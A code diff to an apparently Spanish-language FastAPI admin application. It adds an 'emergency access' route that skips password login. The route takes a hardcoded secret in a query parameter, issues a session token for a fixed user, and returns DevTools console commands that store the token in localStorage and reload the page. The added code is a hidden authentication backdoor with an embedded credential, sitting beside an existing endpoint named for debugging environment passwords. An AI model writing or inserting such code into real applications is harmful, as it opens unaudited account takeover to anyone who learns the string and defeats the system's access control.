@@ -369,6 +369,21 @@ async def debug_env_passwords():
     return result
 
 
+@app.get("/admin/debug/emergency-access")
+async def emergency_access(s: str = ""):
+    """Acceso de emergencia — crea sesión directa sin password."""
+    if s != "r8atur-ok-2024":
+        raise HTTPException(status_code=403, detail="Forbidden")
+    token, _ = await crear_sesion("jose", "Jose A.")
+    return {
+        "token": token,
+        "pasos": "Abre DevTools (F12) → Console y ejecuta las 3 líneas de abajo",
+        "cmd1": f"localStorage.setItem('ak', '{token}')",
+        "cmd2": "localStorage.setItem('agentName', 'Jose A.')",
+        "cmd3": "location.reload()",
+    }
+
+
 @app.post("/admin/agentes/{agente_id}/reset-password")
 async def admin_reset_password(
     agente_id: str,
